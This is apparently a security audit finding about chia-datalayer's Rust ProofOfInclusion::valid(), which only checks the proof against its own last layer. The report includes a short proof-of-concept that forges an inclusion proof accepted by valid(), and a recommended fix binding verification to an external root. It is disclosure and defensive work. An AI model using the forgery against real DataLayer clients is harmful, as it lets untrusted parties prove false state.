### Title
`ProofOfInclusion::valid()` Is a Tautology — Forged DataLayer Inclusion Proofs Always Pass - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` only checks internal self-consistency of the proof chain. The final comparison `existing_hash == self.root_hash()` is a tautology: after the loop, `existing_hash` is always equal to `self.root_hash()` if the loop completes. There is no comparison against any externally-trusted root hash. An attacker who can supply a `ProofOfInclusion` (via `Streamable` deserialization or the Python/wasm binding) can forge a proof claiming any key is included in any DataLayer tree, and `valid()` will return `true`.

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;  // existing_hash = layer.combined_hash
    }

    existing_hash == self.root_hash()  // always true if loop completes
}
``` [1](#0-0) 

And `root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // <-- same field set as existing_hash in last iteration
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

**The tautology**: In the loop body, the guard `if calculated_hash != layer.combined_hash { return false; }` ensures that if the loop completes, `existing_hash` was set to `layer.combined_hash` in the last iteration. `self.root_hash()` returns `last.combined_hash`. Therefore `existing_hash == self.root_hash()` is `last.combined_hash == last.combined_hash` — always `true`. The final check adds zero security.

`ProofOfInclusion` is `Streamable` (serializable/deserializable) and exposed via Python bindings: [3](#0-2) [4](#0-3) 

There is no `valid_for_root(root: Hash)` method. `valid()` is the only validation API, and it does not bind the proof to any externally-known root.

### Impact Explanation

Any DataLayer client code that receives a `ProofOfInclusion` from an untrusted source and calls `proof.valid()` to verify it will accept forged proofs. An attacker can construct a `ProofOfInclusion` (via `from_bytes` / `parse_rust`) with arbitrary `node_hash` and a chain of layers that are internally consistent, and `valid()` returns `true` regardless of whether the claimed key is actually in any real DataLayer tree. This lets untrusted input prove invalid state — forged inclusion — matching the allowed High impact: "DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … or lets untrusted input prove invalid state."

### Likelihood Explanation

The `ProofOfInclusion` struct is `Streamable` and exposed via Python bindings. Any DataLayer application that accepts proofs from external parties (e.g., a DataLayer client verifying a proof-of-inclusion received over the network) and calls `proof.valid()` is vulnerable. The exploit requires only crafting a valid-looking byte sequence — no privileged access, no key material, no chain reorg.

### Recommendation

Replace the standalone `valid()` with a method that requires an external root:

```rust
pub fn valid_for_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root
}
```

The current `valid()` should either be removed or made to call `valid_for_root` with a required parameter, so callers cannot accidentally use the self-referential check.

### Proof of Concept

```rust
use chia_datalayer::{Hash, Side};
use chia_datalayer::merkle::proof_of_inclusion::{ProofOfInclusion, ProofOfInclusionLayer};

fn forge_proof(fake_node_hash: Hash, fake_sibling: Hash) -> ProofOfInclusion {
    // Compute what combined_hash will be so the loop passes
    let combined = chia_datalayer::calculate_internal_hash(
        &fake_node_hash,
        Side::Left,
        &fake_sibling,
    );
    ProofOfInclusion {
        node_hash: fake_node_hash,
        layers: vec![ProofOfInclusionLayer {
            other_hash_side: Side::Left,
            other_hash: fake_sibling,
            combined_hash: combined,  // matches calculated_hash → loop passes
        }],
    }
}

fn main() {
    let fake_node = [0xAA; 32];
    let fake_sibling = [0xBB; 32];
    let proof = forge_proof(fake_node, fake_sibling);
    // valid() returns true for a completely fabricated proof
    assert!(proof.valid());
    // root_hash() returns an attacker-controlled value
    println!("Forged root: {:?}", proof.root_hash());
}
```

The loop check `calculated_hash != layer.combined_hash` passes because the attacker pre-computed `combined_hash` to match. The final check `existing_hash == self.root_hash()` passes because both sides equal `combined_hash`. The proof is accepted as valid despite having no relationship to any real DataLayer tree. [1](#0-0)

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L13-29)
```rust
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusionLayer {
    pub other_hash_side: Side,
    pub other_hash: Hash,
    pub combined_hash: Hash,
}

#[cfg_attr(
    feature = "py-bindings",
    pyclass(get_all, from_py_object),
    derive(PyJsonDict, PyStreamable)
)]
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusion {
    pub node_hash: Hash,
    pub layers: Vec<ProofOfInclusionLayer>,
}
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L32-38)
```rust
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L40-58)
```rust
    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** wheel/python/chia_rs/datalayer.pyi (L236-266)
```text
@final
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...

    def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...

    # TODO: generate
    def __hash__(self) -> int: ...
    def __repr__(self) -> str: ...
    def __deepcopy__(self, memo: object) -> Self: ...
    def __copy__(self) -> Self: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
    @classmethod
    def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
    @classmethod
    def parse_rust(cls, blob: ReadableBuffer, trusted: bool = False) -> tuple[Self, int]: ...
    def to_bytes(self) -> bytes: ...
    def __bytes__(self) -> bytes: ...
    def stream_to_bytes(self) -> bytes: ...
    def get_hash(self) -> bytes32: ...
    def to_json_dict(self) -> dict[str, Any]: ...
    @classmethod
    def from_json_dict(cls, json_dict: dict[str, Any]) -> Self: ...
    def replace(self, *, node_hash: bytes32 = ..., layers: list[ProofOfInclusionLayer] = ...) -> Self: ...
    def truncate(self, field: str, length: int) -> None: ...
```
